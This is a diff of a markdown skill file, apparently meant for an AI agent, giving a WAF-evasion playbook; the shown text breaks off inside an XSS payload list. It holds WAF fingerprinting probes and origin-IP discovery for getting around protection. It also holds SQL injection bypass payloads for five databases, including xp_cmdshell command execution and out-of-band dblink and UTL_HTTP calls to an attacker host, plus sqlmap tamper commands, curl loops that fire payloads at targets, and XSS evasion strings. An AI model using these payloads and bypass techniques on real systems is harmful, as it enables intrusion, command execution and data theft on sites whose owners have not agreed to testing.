@@ -1,1168 +1,2130 @@
 ---
-description: WAF bypass methodology for authorized offensive security engagements. Covers detection/fingerprinting of Cloudflare/AWS WAF/Akamai/ModSecurity/Imperva, SQLi bypass (MySQL/MSSQL/PostgreSQL/Oracle/SQLite), XSS bypass (30+ payloads), command injection bypass, path traversal bypass, XXE bypass, HTTP-level bypass (chunked/headers/method override/IP spoofing), rate limit bypass, Unicode/encoding bypass, origin IP discovery (10 methods), sqlmap tamper scripts, ffuf WAF bypass flags, custom tamper script writing, and a full ASCII bypass decision tree. Load when WAF is blocking attacks on a target.
+description: "Elite WAF bypass methodology: detection, fingerprinting, origin IP discovery, per-vendor bypass techniques, per-vuln-class payload mutation, HTTP-level evasion, encoding chains, automated bypass workflows, custom tamper scripts, 2024-2025 cutting edge techniques."
+trigger: "WAF bypass, firewall evasion, payload obfuscation, WAF fingerprinting, origin IP discovery, tamper scripts, filter evasion, WAF detection, bypass Cloudflare, bypass AWS WAF, bypass ModSecurity, bypass Akamai, bypass Imperva, HTTP smuggling WAF, encoding bypass, SQLi WAF bypass, XSS WAF bypass"
 ---
 
-# WAF BYPASS SKILL
+# WAF Bypass — Elite Methodology (Level 10)
 
-Complete WAF evasion methodology for authorized offensive security engagements.
+Authorized penetration testing only. Every technique here is paired with its detection signature so defenders can validate coverage.
 
-## PHASE 1 — WAF DETECTION AND FINGERPRINTING
+---
+
+## 1. WAF DETECTION & FINGERPRINTING
+
+### 1.1 Passive Detection Signals
+
+**Response Headers**
+```
+Server: cloudflare
+Server: AkamaiGHost
+Server: AkamaiNetStorage
+X-Sucuri-ID: <id>
+X-Powered-By-Plesk: <version>
+X-CDN: Imperva
+X-Iinfo: <fingerprint>
+x-amz-cf-id: <cloudfront>
+x-amz-request-id: <aws>
+X-Cache: HIT from <provider>
+Via: 1.1 varnish
+X-Varnish: <id>
+```
+
+**Cookie Patterns**
+```
+__cfduid=             → Cloudflare (legacy)
+cf_clearance=         → Cloudflare bot challenge
+_utmz=                → Google Analytics, not WAF but useful for correlation
+visid_incap_=         → Imperva Incapsula
+incap_ses_=           → Imperva Incapsula
+nlbi_=                → Imperva Incapsula
+ak_bmsc=              → Akamai Bot Manager
+bm_sv=                → Akamai Bot Manager
+bm_sz=                → Akamai Bot Manager
+__utm[a-z]=           → various
+AWSALB=               → AWS ALB (not WAF but co-located)
+```
+
+**Error Page Fingerprints**
+```
+"Access Denied" + "Sucuri Website Firewall"       → Sucuri
+"Request blocked" + cloudflare-nginx              → Cloudflare
+"The requested URL was rejected" + F5             → F5 BIG-IP
+"You don't have permission" + mod_security        → ModSecurity
+"Error 16" + "This request was blocked"           → Imperva
+"Request Rejected" + Barracuda                    → Barracuda
+"<title>Web Application Firewall" + Fortinet      → FortiWeb
+403 with empty body + X-Amzn-RequestId            → AWS WAF
+"Attention Required!" + Cloudflare                → CF challenge page
+"Sorry, you have been blocked"                    → Cloudflare
+```
+
+**Timing Signals**
+- WAF adds 5-50ms overhead vs direct connection
+- Challenge pages (JS challenges) add 3-10 seconds
+- Rate limiting: response time increases after N requests
+- Measure: `curl -o /dev/null -s -w "%{time_total}\n" https://target.com/`
+
+### 1.2 Active WAF Probing Payloads
+
+Send each payload and analyze response code, body, and headers:
 
 ```bash
-TARGET_URL="https://target.com"
+# Probe 1: Classic SQLi trigger
+curl -ski "https://TARGET/page?id=1' OR '1'='1" -H "User-Agent: Mozilla/5.0"
 
-# Send obvious attack payload — check response for WAF block page
-curl -s "${TARGET_URL}/?id=1' OR 1=1--" | grep -iE "cloudflare|sucuri|incapsula|akamai|barracuda|f5|fortiweb|modsecurity|access denied|blocked|forbidden|security" | tee waf_detect.txt
-curl -s "${TARGET_URL}/?id=1' OR 1=1--" -I | grep -iE "cf-ray|server|x-powered-by|x-sucuri|x-fw|x-iinfo|x-cache" | tee -a waf_detect.txt
+# Probe 2: XSS trigger  
+curl -ski "https://TARGET/page?q=<script>alert(1)</script>"
 
-# HTTP status on attack — 403/406/429/503 = WAF
-HTTP_CODE=$(curl -so /dev/null -w "%{http_code}" "${TARGET_URL}/?id=1' OR 1=1--")
-echo "HTTP code on SQLi probe: $HTTP_CODE" | tee -a waf_detect.txt
+# Probe 3: Path traversal trigger
+curl -ski "https://TARGET/page?file=../../etc/passwd"
 
-# wafw00f — automatic WAF fingerprinting
-wafw00f $TARGET_URL -a 2>/dev/null | tee waf_fingerprint.txt
+# Probe 4: Command injection trigger
+curl -ski "https://TARGET/page?cmd=;cat+/etc/passwd"
 
-# Identify WAF from response headers
-curl -sI $TARGET_URL | tee waf_headers.txt
-grep -i "cf-ray\|__cfduid\|__cf_bm" waf_headers.txt && echo "[+] CLOUDFLARE DETECTED"
-grep -i "x-iinfo\|incap_ses\|visid_incap" waf_headers.txt && echo "[+] INCAPSULA/IMPERVA DETECTED"
-grep -i "ak-bmsc\|akamai" waf_headers.txt && echo "[+] AKAMAI DETECTED"
-grep -i "x-amzn-requestid\|x-amz-cf-id" waf_headers.txt && echo "[+] AWS CLOUDFRONT/WAF DETECTED"
-grep -i "server: barracuda" waf_headers.txt && echo "[+] BARRACUDA DETECTED"
-grep -i "x-sucuri-id\|sucuri" waf_headers.txt && echo "[+] SUCURI DETECTED"
-grep -i "server: f5\|x-waf-status" waf_headers.txt && echo "[+] F5 ASM DETECTED"
-grep -i "x-fw-debug\|server: fortiweb" waf_headers.txt && echo "[+] FORTIWEB DETECTED"
+# Probe 5: Benign baseline (same param, safe value)
+curl -ski "https://TARGET/page?id=1"
 
-# Cloudflare-specific detection
-curl -sI "https://$TARGET_HOST/cdn-cgi/trace" 2>/dev/null | head -20 | tee cloudflare_trace.txt
+# Compare HTTP status codes and response times
+# WAF blocked = 403/406/429/503 on probes 1-4, 200 on probe 5
 ```
 
-### WAF Vendor Cheat Sheet
+**Active Fingerprinting Probe Set**
+```bash
+PAYLOADS=(
+  "' OR '1'='1"
+  "<script>alert(1)</script>"
+  "../../../etc/passwd"
+  ";ls -la"
+  "UNION SELECT 1,2,3--"
+  "AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--"
+  "exec(chr(120)+chr(112)+chr(95)+chr(99)+chr(109)+chr(100))"
+  "${7*7}"
+  "{{7*7}}"
+  "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+)
 
-```
-CLOUDFLARE:
-  Headers: CF-RAY, CF-Cache-Status, __cfduid, __cf_bm, cf-request-id
-  Block page: "Attention Required! | Cloudflare"
-  Response: HTTP 403 or 1020
-  Error page: Ray ID at bottom
-
-AWS WAF:
-  Headers: x-amzn-RequestId, X-Amz-Cf-Id (CloudFront)
-  Block page: HTTP 403, {"message":"Forbidden"}
-  Can combine with CloudFront
-
-AKAMAI:
-  Headers: X-Check-Cacheable, AK-BMsc, Akamai-Origin-Hop
-  Block page: "Access Denied — Akamai Reference"
-  Rate limit: 429 with X-RateLimit headers
-
-IMPERVA/INCAPSULA:
-  Cookies: incap_ses_*, visid_incap_*
-  Headers: X-Iinfo, X-CDN
-  Block page: "Request unsuccessful. Incapsula incident ID"
-
-MODSECURITY (CRS):
-  Headers: Server: Apache (no WAF header)
-  Block page: "Not Acceptable!" HTTP 406 / 403
-  Audit log: /var/log/apache2/modsec_audit.log
-
-SUCURI:
-  Headers: X-Sucuri-ID, X-Sucuri-Cache
-  Block page: "Website Firewall — Access Denied"
-
-F5 BIG-IP ASM:
-  Cookies: TS01* (F5 cookie)
-  Block page: "The requested URL was rejected"
-  Headers: X-WAF-Status, Server: BigIP
+for p in "${PAYLOADS[@]}"; do
+  RESP=$(curl -ski "https://TARGET/?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$p'))")" 2>&1)
+  STATUS=$(echo "$RESP" | grep "^HTTP" | awk '{print $2}')
+  echo "[$STATUS] $p"
+done
 ```
 
-## PHASE 2 — ORIGIN IP DISCOVERY (10 METHODS)
+### 1.3 Vendor Signature Reference Table
+
+| Vendor | Header Signature | Cookie Signature | Block Page Pattern | Status Code |
+|--------|-----------------|------------------|--------------------|-------------|
+| Cloudflare | `Server: cloudflare` | `cf_clearance` | "Sorry, you have been blocked" | 403/503 |
+| AWS WAF | `X-Amzn-RequestId` | none | "Forbidden" (empty body common) | 403 |
+| Akamai | `Server: AkamaiGHost` | `ak_bmsc`, `bm_sv` | "Access Denied" with Ref# | 403 |
+| Imperva | `X-Iinfo`, `X-CDN: Imperva` | `visid_incap_`, `nlbi_` | "Error 16" blocked | 403 |
+| Sucuri | `X-Sucuri-ID` | none | "Sucuri Website Firewall" | 403 |
+| ModSecurity | `Server: Apache` (no WAF header) | none | "406 Not Acceptable" or "403 Forbidden" w/ ModSec message | 403/406 |
+| F5 BIG-IP | `Server: BigIP` or F5 cookie | `BIGipServer*` | "The requested URL was rejected" | 403 |
+| Barracuda | none exposed | `barra_counter_session` | "You are not authorized" Barracuda | 403 |
+| FortiWeb | `FORTIWAFSID=` | `FORTIWAFSID` | Fortinet block page | 403 |
+| Radware | `X-SL-CompState` | `SlBrowserKey` | Radware block | 403 |
+| Citrix NetScaler | `Via: NS-CACHE` | `NSC_*` | NetScaler block page | 403 |
+| Wallarm | none exposed | none | Wallarm block (nginx) | 403 |
+| StackPath | `X-SP-*` | none | StackPath block | 403 |
+| Fastly | `X-Served-By`, `X-Cache` | none | Fastly error page | 403 |
+| Azure Front Door | `X-Azure-Ref` | none | Azure WAF block | 403 |
+
+### 1.4 WAF Confidence Scoring System
+
+Score 0-100 based on signals observed:
+
+```
++30: Block page contains known vendor string
++25: Response header matches vendor signature
++20: Cookie matches vendor pattern
++15: Block HTTP status matches expected code
++10: Timing analysis shows WAF overhead
++05: Error ID format matches vendor format
+─────────────────────────────────────────
+90-100: Confirmed vendor identified
+70-89:  High confidence, likely identified
+50-69:  Medium confidence, probable vendor
+30-49:  Low confidence, WAF present, vendor unclear
+0-29:   No WAF detected (probe deeper or WAF is passive)
+```
+
+### 1.5 Automated Fingerprinting One-Liners
 
 ```bash
-TARGET_DOMAIN="target.com"
-WORKSPACE=~/recon_target
+# whatwaf (Python tool)
+whatwaf -u https://TARGET --ra --pl 5
 
-# Method 1: Historical DNS records (SecurityTrails / PassiveDNS)
-curl -s "https://api.securitytrails.com/v1/history/${TARGET_DOMAIN}/dns/a" \
-  -H "APIKEY: YOUR_KEY" | jq -r '.records[].values[].ip' | sort -u > origin_securitytrails.txt
-curl -s "https://api.securitytrails.com/v1/domain/${TARGET_DOMAIN}" \
-  -H "APIKEY: YOUR_KEY" | jq -r '.current_dns.a.values[].ip' >> origin_securitytrails.txt
+# wafw00f
+wafw00f https://TARGET -a
 
-# Method 2: Certificate transparency — find IPs from cert SAN/CN
-curl -s "https://crt.sh/?q=%25.$TARGET_DOMAIN&output=json" | jq -r '.[].name_value' | \
-  while read host; do
-    ip=$(dig +short $host A 2>/dev/null | head -1)
-    [ -n "$ip" ] && echo "$host -> $ip"
-  done | tee origin_cert_ips.txt
+# Manual curl fingerprint
+curl -sI "https://TARGET/?id=1%27" | grep -iE "(server|x-powered|cf-|x-iinfo|x-sucuri|x-amz|x-cdn|via|x-cache)"
 
-# Method 3: Shodan — search by SSL cert for this domain
-shodan search "ssl.cert.subject.cn:$TARGET_DOMAIN" --fields ip_str,port 2>/dev/null | tee origin_shodan.txt
-shodan search "http.title:\"$TARGET_DOMAIN\"" --fields ip_str,port 2>/dev/null >> origin_shodan.txt
-# Shodan SSL fingerprint
-shodan search "ssl:$TARGET_DOMAIN -has_vuln:false" --fields ip_str 2>/dev/null >> origin_shodan.txt
+# Nmap WAF detection
+nmap -p 80,443 --script http-waf-detect,http-waf-fingerprint TARGET
 
-# Method 4: Censys — SSL certificate search
-curl -s "https://search.censys.io/api/v2/hosts/search" \
+# HTTPx with probe
+echo "TARGET" | httpx -status-code -server -content-type -silent -H "X-Scan: 1'OR'1'='1"
+
+# Check Cloudflare specifically
+dig +short TARGET | grep -E "^(104\.|172\.(6[4-9]|7[0-9]|8[01])\.|162\.158\.|198\.(41|18[0-9])\.|190\.93\.|188\.114\.|197\.234\.)"
+```
+
+---
+
+## 2. ORIGIN IP DISCOVERY (12 Methods)
+
+### Method 1: SecurityTrails Historical DNS
+
+```bash
+# API key required — free tier available
+curl -s "https://api.securitytrails.com/v1/history/TARGET.COM/dns/a" \
+  -H "APIKEY: YOUR_API_KEY" | jq '.records[].values[].ip'
+
+# Also check AAAA records
+curl -s "https://api.securitytrails.com/v1/history/TARGET.COM/dns/aaaa" \
+  -H "APIKEY: YOUR_API_KEY" | jq '.records[].values[].ipv6'
+```
+
+### Method 2: Certificate Transparency Logs
+
+```bash
+# crt.sh enumeration
+curl -s "https://crt.sh/?q=%.TARGET.COM&output=json" | jq -r '.[].name_value' | sort -u
+
+# Censys certificate search
+# Using Censys API
+curl -s "https://search.censys.io/api/v2/certificates/search" \
+  -H "Authorization: Basic BASE64(API_ID:API_SECRET)" \
   -H "Content-Type: application/json" \
-  -u "API_ID:API_SECRET" \
-  -d "{\"q\":\"parsed.names:$TARGET_DOMAIN\",\"fields\":[\"ip\",\"443.https.tls.certificate.parsed.names\"]}" \
-  | jq -r '.result.hits[].ip' | tee origin_censys.txt
+  -d '{"q":"parsed.names: TARGET.COM","per_page":100}' | \
+  jq -r '.result.hits[].parsed.subject_dn'
 
-# Method 5: Favicon hash — find origin via Shodan favicon search
-# Calculate favicon murmur hash first
-curl -s "https://$TARGET_DOMAIN/favicon.ico" -o /tmp/fav.ico 2>/dev/null
+# Extract IPs from cert SAN results
+curl -s "https://crt.sh/?q=TARGET.COM&output=json" | \
+  jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | \
+  while read sub; do
+    ip=$(dig +short "$sub" 2>/dev/null | grep -E '^[0-9]+\.')
+    [ -n "$ip" ] && echo "$sub → $ip"
+  done
+```
+
+### Method 3: Shodan/Censys Favicon Hash
+
+```bash
+# Calculate favicon hash for Shodan
 python3 -c "
-import mmh3, base64
-data = open('/tmp/fav.ico','rb').read()
-b64 = base64.encodebytes(data)
-h = mmh3.hash(b64)
-print(f'http.favicon.hash:{h}')
-" 2>/dev/null | tee origin_favicon_hash.txt
-# Search on Shodan: shodan search "http.favicon.hash:HASH" --fields ip_str
+import requests, mmh3, codecs
+r = requests.get('https://TARGET.COM/favicon.ico', verify=False)
+favicon = codecs.encode(r.content, 'base64')
+hash = mmh3.hash(favicon)
+print(f'http.favicon.hash:{hash}')
+"
 
-# Method 6: SPF record — reveals mail server IPs (often same subnet)
-dig $TARGET_DOMAIN TXT | grep "spf\|include\|ip4\|ip6" | tee origin_spf.txt
-# Extract IPs from SPF
-dig $TARGET_DOMAIN TXT | grep -oP "ip4:\K[0-9./]+" | tee origin_spf_ips.txt
+# Search Shodan
+curl -s "https://api.shodan.io/shodan/host/search?key=SHODAN_API_KEY&query=http.favicon.hash:HASH_VALUE" | \
+  jq -r '.matches[].ip_str'
 
-# Method 7: Email headers — find originating mail server IP
-# Check MX record, send email, inspect headers
-MX=$(dig $TARGET_DOMAIN MX +short | sort -n | head -1 | awk '{print $2}')
-dig +short $MX A | tee origin_mx.txt
+# Censys equivalent
+curl -s "https://search.censys.io/api/v2/hosts/search" \
+  -H "Authorization: Basic BASE64" \
+  -d '{"q":"services.http.response.favicon.md5_hash:HASH"}' | \
+  jq -r '.result.hits[].ip'
+```
 
-# Method 8: Subdomains that bypass CDN — direct IP exposure
-for sub in mail smtp ftp cpanel direct origin backend api-internal dev staging test; do
-  IP=$(dig +short $sub.$TARGET_DOMAIN A 2>/dev/null | head -1)
-  if [ -n "$IP" ]; then
-    # Check if this IP is a CDN IP
-    echo "$IP $sub.$TARGET_DOMAIN" | tee -a origin_subdomains.txt
+### Method 4: SPF/MX Record Analysis
+
+```bash
+# SPF records often reveal origin mail servers on same IP block
+dig TXT TARGET.COM | grep spf | tr ' ' '\n' | grep -E '(ip4|ip6|include|a:|mx:)'
+
+# MX records resolve to mail servers, often same /24 as web server
+dig MX TARGET.COM | awk '{print $NF}' | while read mx; do
+  dig +short "$mx"
+done
+
+# Check for direct-to-IP mail delivery bypassing WAF
+dig A mail.TARGET.COM
+dig A smtp.TARGET.COM
+dig A mx1.TARGET.COM
+dig A mx2.TARGET.COM
+```
+
+### Method 5: Email Header Analysis
+
+```bash
+# Send email to contact@TARGET.COM, harvest Received headers
+# Look for:
+# Received: from TARGET.COM ([REAL_IP]) by...
+# X-Originating-IP: REAL_IP
+# Return-Path: <user@TARGET.COM>
+
+# Parse Received headers for IPs
+cat email_headers.txt | grep "^Received:" | \
+  grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | \
+  grep -v "^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.)"
+```
+
+### Method 6: Subdomain Scanning for Non-CDN IPs
+
+```bash
+# Common subdomains that skip WAF
+SUBS=(direct dev staging beta test api mail smtp ftp cpanel webmail admin old legacy origin backend)
+
+for sub in "${SUBS[@]}"; do
+  ip=$(dig +short "${sub}.TARGET.COM" 2>/dev/null | grep -E '^[0-9]+\.')
+  if [ -n "$ip" ]; then
+    # Check if IP is in known CDN range
+    CF=$(echo "$ip" | grep -E "^(104\.|172\.(6[4-9]|7[0-9]|8[01])\.|162\.158\.|198\.41\.)")
+    [ -z "$CF" ] && echo "[POSSIBLE ORIGIN] ${sub}.TARGET.COM → $ip"
   fi
 done
 
-# Method 9: Error page fingerprinting — origin may expose itself in errors
-# Request non-existent resource, compare error page to direct IP access
-curl -s "${TARGET_URL}/DOESNOTEXIST_$(date +%s)" > /tmp/cdn_error.txt
-# Try direct IP access
-TARGET_IP=$(dig +short $TARGET_DOMAIN | head -1)
-curl -s -H "Host: $TARGET_DOMAIN" "https://$TARGET_IP/DOESNOTEXIST_$(date +%s)" 2>/dev/null > /tmp/origin_error.txt
-diff /tmp/cdn_error.txt /tmp/origin_error.txt > /tmp/error_diff.txt && echo "Errors differ — IP may not be origin"
-
-# Method 10: Web archive — old DNS records before CDN
-curl -s "http://web.archive.org/cdx/search/cdx?url=$TARGET_DOMAIN&output=json&fl=timestamp,original,statuscode&limit=50" \
-  | python3 -c "
-import json,sys
-for r in json.load(sys.stdin)[1:]:
-    print(r)
-" 2>/dev/null | tee origin_wayback.txt
-
-# Subdomain finder for origin IPs
-for sub in $(cat $WORKSPACE/recon/subdomains/all_subdomains.txt); do
-  IP=$(dig +short $sub A 2>/dev/null | head -1)
-  [ -n "$IP" ] && echo "$IP $sub" >> origin_all_subs.txt
-done
-# Filter out known CDN IP ranges (Cloudflare: 103.21.244.0/22, 103.22.200.0/22, etc.)
-python3 -c "
-import ipaddress
-cloudflare = [
-    '103.21.244.0/22','103.22.200.0/22','103.31.4.0/22','104.16.0.0/13',
-    '104.24.0.0/14','108.162.192.0/18','131.0.72.0/22','141.101.64.0/18',
-    '162.158.0.0/15','172.64.0.0/13','173.245.48.0/20','188.114.96.0/20',
-    '190.93.240.0/20','197.234.240.0/22','198.41.128.0/17'
-]
-cf_nets = [ipaddress.ip_network(n) for n in cloudflare]
-with open('origin_all_subs.txt') as f:
-    for line in f:
-        try:
-            ip, host = line.strip().split(' ',1)
-            addr = ipaddress.ip_address(ip)
-            if not any(addr in net for net in cf_nets):
-                print(f'NON-CDN: {ip} {host}')
-        except: pass
-" 2>/dev/null | tee origin_non_cdn.txt
-
-# Verify origin candidate
-for ip in $(awk '{print $1}' origin_non_cdn.txt | sort -u); do
-  STATUS=$(curl -sk -H "Host: $TARGET_DOMAIN" "https://$ip/" -o /dev/null -w "%{http_code}" 2>/dev/null)
-  [ "$STATUS" != "000" ] && echo "[ORIGIN CANDIDATE] $ip -> HTTP $STATUS" | tee -a origin_confirmed.txt
-done
+# Try direct access with Host header
+curl -sk "https://ORIGIN_IP/" -H "Host: TARGET.COM" -I
 ```
 
-## PHASE 3 — SQLI WAF BYPASS
-
-### MySQL
-
-```
-TECHNIQUE                          PAYLOAD EXAMPLE
-----------------------------------------------------------------------
-1.  Inline comments                1/**/OR/**/1=1--
-2.  Multi-line comments            1/*!OR*/1=1--
-3.  Version comment                1/*!50000OR*/1=1--
-4.  Case variation                 1 oR 1=1--
-5.  Double-keyword (bypass strip)  1 OORR 1=1--
-6.  URL encoding                   1%20OR%201%3D1--
-7.  HTML entity                    1&#x20;OR&#x20;1=1--
-8.  Unicode whitespace             1\u0009OR\u00091=1-- (tab)
-9.  Null byte injection            1%00 OR 1=1--
-10. Scientific notation            1e0 OR 1e0=1e0--
-11. Backtick identifier            SELECT `username` FROM users
-12. @ variable                     SELECT @v:=1 FROM users WHERE @v=1
-13. Hex encoding                   1 OR 0x313d31--  (0x31='1')
-14. CHAR() function                1 OR CHAR(49)=CHAR(49)--
-15. Concat                         1 OR CONCAT(0x61,0x64,0x6d,0x69,0x6e)='admin'
-16. GROUP_CONCAT bypass            SELECT GROUP_CONCAT(table_name SEPARATOR ',')
-17. Subquery spacing               1 OR(SELECT(1))=1--
-18. Comparison operators           1 OR 1 LIKE 1
-19. Bitwise operators              1 | 0
-20. LIMIT bypass                   LIMIT 0,1 -> LIMIT 0e0,1
-```
+### Method 7: Web Archive Historical IP
 
 ```bash
-TARGET_URL="https://target.com/api/products"
+# Wayback Machine CDX API for historical data
+curl -s "http://web.archive.org/cdx/search/cdx?url=TARGET.COM&output=json&fl=timestamp,original,statuscode&limit=100" | \
+  jq -r '.[] | "\(.[0]) \(.[1])"' | head -20
 
-# MySQL bypass payloads
-MYSQL_BYPASSES=(
-  "1/**/OR/**/1=1--+-"
-  "1/*!50000OR*/1=1--+-"
-  "1%0aOR%0a1=1--+-"
-  "1%09OR%091=1--+-"
-  "1%0bOR%0b1=1--+-"
-  "1%0cOR%0c1=1--+-"
-  "1%0dOR%0d1=1--+-"
-  "1%a0OR%a01=1--+-"
-  "1%23%0aOR%23%0a1=1--+-"
-  "1/*!OR*/1=1--+-"
-  "1 oR 1=1--+-"
-  "1 Or 1=1--+-"
-  "1 OORR 1=1--+-"
-  "1%00OR 1=1--+-"
-)
+# viewdns.info IP history
+curl -s "https://viewdns.info/iphistory/?domain=TARGET.COM" | \
+  grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}'
 
-for payload in "${MYSQL_BYPASSES[@]}"; do
-  STATUS=$(curl -so /dev/null -w "%{http_code}" "${TARGET_URL}?id=$payload")
-  RESP=$(curl -s "${TARGET_URL}?id=$payload" | wc -c)
-  echo "$STATUS ($RESP bytes) <- $payload" | tee -a sqli_mysql_bypass.txt
-done
-
-# MySQL UNION bypass
-curl -s "${TARGET_URL}?id=1 UNION/**/SELECT/**/1,2,3--+-" | tee sqli_union1.txt
-curl -s "${TARGET_URL}?id=1/*!UNION*//*!SELECT*/1,2,3--+-" | tee sqli_union2.txt
-curl -s "${TARGET_URL}?id=1%0aUNION%0aSELECT%0a1,2,3--+-" | tee sqli_union3.txt
-curl -s "${TARGET_URL}?id=1 UNION%23foo%0aSELECT 1,2,3--+-" | tee sqli_union4.txt
-
-# MySQL information_schema bypass
-curl -s "${TARGET_URL}?id=1 UNION SELECT table_name,2,3 FROM/**/information_schema/**/tables--+-" | tee sqli_tables.txt
-curl -s "${TARGET_URL}?id=1 UNION SELECT table_name,2,3 FROM(information_schema.tables)--+-" | tee sqli_tables2.txt
-
-# sqlmap with tamper for MySQL WAF
-sqlmap -u "${TARGET_URL}?id=1" \
-  --tamper=space2comment,charencode,greatest,ifnull2ifisnull,modsecurityversioned \
-  --level=5 --risk=3 --batch -p id \
-  --dbms=mysql -v 3 | tee sqlmap_mysql_bypass.txt
+# Check archive for old DNS (requires manual inspection)
+# https://web.archive.org/web/*/TARGET.COM
 ```
 
-### MSSQL
-
-```
-TECHNIQUE                          PAYLOAD EXAMPLE
-----------------------------------------------------------------------
-1.  Comment injection              1/**/OR/**/1=1--
-2.  Case mix                       1 Or 1=1--
-3.  URL encode spaces              1%20OR%201=1--
-4.  Tab/newline delimit            1[TAB]OR[TAB]1=1--
-5.  EXEC xp_cmdshell               EXEC(0x78705f636d647368656c6c...)
-6.  Hex string concat              SELECT CHAR(65)+CHAR(68)+CHAR(77)+CHAR(73)+CHAR(78)
-7.  Variable assignment            DECLARE @v NVARCHAR(100); SET @v='admin'; SELECT @v
-8.  Stacked queries                1; EXEC xp_cmdshell('whoami')--
-9.  WAITFOR DELAY (blind)          1; WAITFOR DELAY '0:0:5'--
-10. Subquery                       (SELECT TOP 1 name FROM sysobjects WHERE xtype='U')
-11. CAST bypass                    1 OR CAST(1 AS INT)=1
-12. IIF function                   SELECT IIF(1=1,'a','b')
-13. String split bypass            SELECT * FROM users WHERE id='1' OR '1'='1'
-14. OPENROWSET SSRF                SELECT * FROM OPENROWSET('SQLNCLI','server=attacker;uid=sa;pwd=x;','SELECT 1')
-15. sys.objects                    SELECT name FROM sys.objects WHERE type='U'
-```
+### Method 8: SSL Certificate SAN Analysis
 
 ```bash
-# MSSQL tamper scripts
-sqlmap -u "${TARGET_URL}?id=1" \
-  --tamper=space2mssqlblank,charencode,equaltolike,greatest \
-  --level=5 --risk=3 --batch --dbms=mssql | tee sqlmap_mssql_bypass.txt
+# Extract SANs from live certificate
+openssl s_client -connect TARGET.COM:443 </dev/null 2>/dev/null | \
+  openssl x509 -noout -text | grep -A1 "Subject Alternative Name" | \
+  tr ',' '\n' | grep "DNS:" | sed 's/.*DNS://' | tr -d ' '
 
-# MSSQL blind time-based bypass
-curl -s "${TARGET_URL}?id=1;WAITFOR%20DELAY%20'0:0:5'--" | tee mssql_timebased.txt
-
-# MSSQL stacked query
-curl -s "${TARGET_URL}?id=1;EXEC%20xp_cmdshell('whoami')--" | tee mssql_exec.txt
-```
-
-### PostgreSQL
-
-```
-TECHNIQUE                          PAYLOAD EXAMPLE
-----------------------------------------------------------------------
-1.  Dollar quoting                 SELECT $$admin$$
-2.  Type cast                      SELECT 1::boolean
-3.  Function bypass                SELECT CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78)
-4.  Pg_sleep (blind)               1;SELECT pg_sleep(5)--
-5.  Copy to/from                   COPY (SELECT passwd FROM pg_shadow) TO '/tmp/out'
-6.  PL/pgSQL execute               CREATE OR REPLACE FUNCTION exec(text) RETURNS text AS $$ BEGIN PERFORM pg_sleep(5); END; $$ LANGUAGE plpgsql; SELECT exec('id')
-7.  CASE WHEN blind                1 AND (CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
-8.  Array functions                SELECT array_to_string(ARRAY(SELECT table_name FROM information_schema.tables),',')
-9.  String_agg                     SELECT string_agg(table_name,',') FROM information_schema.tables
-10. OID casting                    SELECT relname FROM pg_class WHERE oid=16384
-```
-
-```bash
-sqlmap -u "${TARGET_URL}?id=1" \
-  --tamper=space2comment,charencode,chardoubleencode,between,greatest \
-  --level=5 --risk=3 --batch --dbms=postgresql | tee sqlmap_pg_bypass.txt
-
-# PostgreSQL OOB via dblink
-curl -s "${TARGET_URL}?id=1;SELECT+dblink_connect('host=attacker.com user=a password=a dbname=a')--"
-```
-
-### Oracle
-
-```
-TECHNIQUE                          PAYLOAD EXAMPLE
-----------------------------------------------------------------------
-1.  DUAL table                     SELECT 1 FROM dual
-2.  All_tables                     SELECT table_name FROM all_tables
-3.  DBMS_PIPE                      DBMS_PIPE.RECEIVE_MESSAGE('a',5) -- time-based
-4.  UTL_HTTP SSRF                  SELECT UTL_HTTP.REQUEST('http://attacker/') FROM dual
-5.  CTXCAT syntax                  SELECT * FROM ctxsys.ctx_user_indexes
-6.  Comment style                  1 --  (double dash works)
-7.  Concat via ||                  SELECT 'admin'||'istrator' FROM dual
-8.  NVL function                   SELECT NVL(null,'admin') FROM dual
-9.  DECODE bypass                  SELECT DECODE(1,1,'yes','no') FROM dual
-10. XMLType SSRF                   SELECT XMLType('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker/">%remote;]><r/>') FROM dual
-```
-
-### SQLite
-
-```
-TECHNIQUE                          PAYLOAD EXAMPLE
-----------------------------------------------------------------------
-1.  sqlite_master                  SELECT name FROM sqlite_master WHERE type='table'
-2.  RANDOMBLOB timing              1 AND 1=(SELECT 1 FROM sqlite_master WHERE randomblob(500000000))
-3.  LOAD_EXTENSION                 SELECT LOAD_EXTENSION('/lib/libc.so.6','system')
-4.  String concat                  SELECT 'adm'||'in'
-5.  Type casting                   SELECT CAST(1 AS TEXT)
-6.  HEX encode                     SELECT HEX(name) FROM sqlite_master
-7.  SUBSTR                         SELECT SUBSTR(sqlite_version(),1,1)
-```
-
-## PHASE 4 — XSS WAF BYPASS
-
-```bash
-TARGET_URL="https://target.com/search"
-PARAM="q"
-
-# 30+ XSS bypass payloads
-XSS_PAYLOADS=(
-  # Basic encoding
-  "<script>alert(1)</script>"
-  "<ScRiPt>alert(1)</ScRiPt>"
-  "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
-  "%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E"
-  "\x3cscript\x3ealert(1)\x3c/script\x3e"
-  "&#60;script&#62;alert(1)&#60;/script&#62;"
-  "&lt;script&gt;alert(1)&lt;/script&gt;"
-  # Event handlers
-  "<img src=x onerror=alert(1)>"
-  "<img src=x onerror=alert\`1\`>"
-  "<img src=x onerror=\"alert(1)\">"
-  "<img src=x onerror='alert(1)'>"
-  "<img/src=x/onerror=alert(1)>"
-  "<img src=x onerror=alert(document.domain)>"
-  # Without event handler keyword
-  "<body onload=alert(1)>"
-  "<svg onload=alert(1)>"
-  "<svg/onload=alert(1)>"
-  "<details open ontoggle=alert(1)>"
-  "<select autofocus onfocus=alert(1)>"
-  "<input autofocus onfocus=alert(1)>"
-  "<video src=x onerror=alert(1)>"
-  "<audio src=x onerror=alert(1)>"
-  # Attribute context
